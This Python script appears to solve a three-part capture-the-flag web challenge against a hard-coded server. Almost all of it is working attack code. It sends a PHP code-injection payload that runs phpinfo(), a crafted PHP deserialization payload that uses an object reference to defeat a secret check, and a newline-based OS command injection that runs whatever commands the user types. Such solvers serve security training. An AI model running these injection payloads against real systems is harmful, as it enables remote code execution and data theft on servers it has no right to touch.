import requests
import re

baseurl = "http://195.110.58.115:8080/"
flag = ""

def solve_part1(flag):
    try:
        src = "{${phpinfo()}}"

        response = requests.get(f"{baseurl}index.php?str={src}")
        
        if response.status_code == 200:

            phpinfo_output = response.text
            index = phpinfo_output.find("ACTF{")
            if index != -1:
                first_part_flag = phpinfo_output[index:index + 18]
                flag += first_part_flag
            else:
                print("Flag part not found in phpinfo() output.")
        else:
            print(f"Failed to read phpinfo(). Status code: {response.status_code}")
    except Exception as e:
        print(f"An error occurred in part 1: {e}")
    return flag

def solve_part2(flag):
    try:
       
        payload = 'O:8:"just4fun":2:{s:5:"enter";N;s:6:"secret";R:2;}'
        

        response = requests.get(f"{baseurl}index2.php?pass={payload}")
        part2 = response.text
        

        if response.status_code == 200:
            match = re.search(r'secret:\s+(\S+)\s+(\S+)', part2)
            if match:
                second_part_flag = match.group(1)
                flag += second_part_flag
            else:
                print("Pattern 'secret:' followed by two non-whitespace words not found in the response content.")
        else:
            print(f"Failed to get the second part of the flag. Status code: {response.status_code}")
    except Exception as e:
        print(f"An error occurred in part 2: {e}")
    return flag

def solve_part3(flag):
    try:
        for i in range(2):
            ip = input("Enter the command you want to execute: ")

            response = requests.get(f"{baseurl}index3.php?ip=0%0a{ip}")
            res = response.text
            
            if response.status_code == 200:
                pattern = r'(_.*?})</pre>'

                match = re.search(pattern, res)
                
                if match:
                    part3 = match.group(1)
                    flag += part3
                else:
                    print("No match found.")

                print("Response:")
                print(res)
            else:
                print(f"Failed to execute the command. Status code: {response.status_code}")
    except Exception as e:
        print(f"An error occurred in part 3: {e}")
    return flag


if __name__ == "__main__":
    flag = solve_part1(flag)
    flag = solve_part2(flag)
    flag = solve_part3(flag)
    print("Complete flag:", flag)
